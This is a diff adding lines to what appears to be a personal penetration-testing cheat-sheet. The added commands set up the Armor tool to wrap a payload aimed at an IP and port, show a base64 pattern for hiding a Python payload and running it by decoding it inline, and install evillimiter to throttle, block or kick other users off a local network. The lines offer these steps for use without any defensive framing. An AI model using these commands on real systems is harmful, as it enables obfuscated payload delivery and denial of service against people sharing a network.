@@ -918,6 +918,32 @@ nikto -h www.domain.com -Format msf+
 https://www.tenable.com/products/nessus
 https://localhost:8834/
 
+git clone https://github.com/tokyoneon/Armor
+cd Armor/
+chmod +x armor.sh
+echo 'ls -la' >/tmp/payload.txt
+./armor.sh /tmp/payload.txt 1.2.3.4 443
+
+
+
+cat thisfileisevil.py | base64
+python -c "$(printf '%s' 'ENCODED-PAYLOAD-HERE' | base64 -D)"
+
+############
+
+
+## EVIL LIMITER--> TO DE AUTH AND KICK OFF NETWORK USERS ###
+git clone https://github.com/bitbrute/evillimiter.git
+cd evillimiter
+sudo python3 setup.py install
+sudo evillimiter
+limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS 
+block 3
+hosts
+free all
+
+
+
 
 ######## OPEN SSL #######
 # use private key to sign secret.enc. 
